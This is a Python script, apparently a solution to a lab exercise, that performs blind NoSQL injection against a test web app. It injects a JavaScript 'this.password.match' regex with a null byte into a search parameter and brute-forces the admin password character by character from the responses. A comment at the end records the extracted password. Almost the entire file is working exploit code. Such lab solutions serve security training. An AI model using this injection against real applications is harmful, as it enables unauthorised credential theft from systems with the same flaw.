import urllib.request
import re

#variables

url = "http://ptc-a374cd52-04669da8.libcurl.so/?search=admin"
injection = "'%20%26%26%20this.password.match(/^"
ending = "$/)%00"
wildcard = ".*"
passwordlist = []

# Creating hex array
hexarray = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","x","w","y","z"]


#define checkLetter function
def checkLetter():
    global password
    global passwordlist
    global wildcard

    #for each item on list, check if it's accepted as a password with wildcard
    for x in hexarray:
        requestwild = urllib.request.urlopen(url+injection+password+x+wildcard+ending)
        request = urllib.request.urlopen(url+injection+password+x+ending)
        responsewild = re.findall(">admin<",str(requestwild.read(4096)))
        response = re.findall(">admin<",str(request.read(4096)))
        print("character: "+x+" | payload: "+injection+password+x+wildcard+ending)
        if (len(responsewild) > 0): #Se deu certo com wildcard
            password += x
            passwordlist.append(x)
            print(password)
            if(len(response) > 0): #se deu certo sem wildcard
                return
            break
        else:
            continue
        
i = 1
password = ""
while i <= 40: #This is how many characters there are in the password
    print("Iteration: "+str(i))
    if (i == 9 or i == 14 or i == 19 or i == 24):
        password += "-"
        print(password)
        print(passwordlist)
    else:
        checkLetter()
    i += 1

print(password)

#5b317d17-3ee3-4865-8605-bb579f58c10a

